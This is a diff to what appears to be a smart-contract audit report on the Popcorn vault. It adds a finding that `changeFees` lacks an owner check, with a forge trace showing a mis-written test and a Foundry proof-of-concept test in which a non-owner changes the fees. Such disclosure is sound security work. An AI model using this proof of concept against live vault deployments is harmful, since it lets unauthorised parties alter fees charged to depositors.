@@ -29,6 +29,10 @@ Traces:
 Test result: ok. 1 passed; 0 failed; finished in 7.64ms
 ```
 
+
+
+
+
 Finding #2
 Affected code:
 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L594
@@ -91,4 +95,48 @@ PoC:
 
 Recommendation: add `onlyOwner` modifier to `changeAdapter` function and refactor `testFail__changeAdapter_NonOwner`
 
+
+
+
+Finding #3 
+Affected code:
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L540-L546
+https://github.com/code-423n4/2023-01-popcorn/blob/main/test/vault/Vault.t.sol#L757-L760
+
+Missing `onlyOwner` modifier on `src.vault.Vault.changeFees` allows anyone change fees to the previously proposed fees after the quit period has passed. The existing test in `test.vault.Vault.testFail__changeFees_NonOwner ` is incorrectly implemented to verify the issue and fails on `NotPassedQuitPeriod` rather than properly catching the error of lack of ownership, e.g.
+```
+ ~/se/currents/latest/2023-01-popcorn │ on main !2 ?1  forge test --match-path test/vault/Vault.t.sol --match-test "testFail__changeFees_NonOwner" -vvvv
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Running 1 test for test/vault/Vault.t.sol:VaultTest
+[PASS] testFail__changeFees_NonOwner() (gas: 14996)
+Traces:
+  [14996] VaultTest::testFail__changeFees_NonOwner() 
+    ├─ [0] VM::prank(alice: [0x000000000000000000000000000000000000ABcD]) 
+    │   └─ ← ()
+    ├─ [4757] vault::changeFees() 
+    │   └─ ← "NotPassedQuitPeriod(259200)"
+    └─ ← "NotPassedQuitPeriod(259200)"
+
+Test result: ok. 1 passed; 0 failed; finished in 5.01ms
+```
+PoC:
+```
+    function test__anyoneCanChangeFees() public {
+    VaultFees memory newVaultFees = VaultFees({ deposit: 1, withdrawal: 1, management: 1, performance: 1 });
+    vault.proposeFees(newVaultFees);
+
+    vm.warp(block.timestamp + 3 days);
+
+    vm.expectEmit(false, false, false, true, address(vault));
+    emit ChangedFees(VaultFees({ deposit: 0, withdrawal: 0, management: 0, performance: 0 }), newVaultFees);
+    
+    vm.prank(alice);
+    vault.changeFees();
+    vm.stopPrank();
+  }
+```
+
+Recommendation: add `onlyOwner` modifier to `changeFees` function and refactor `testFail__changeFees_NonOwner`
 
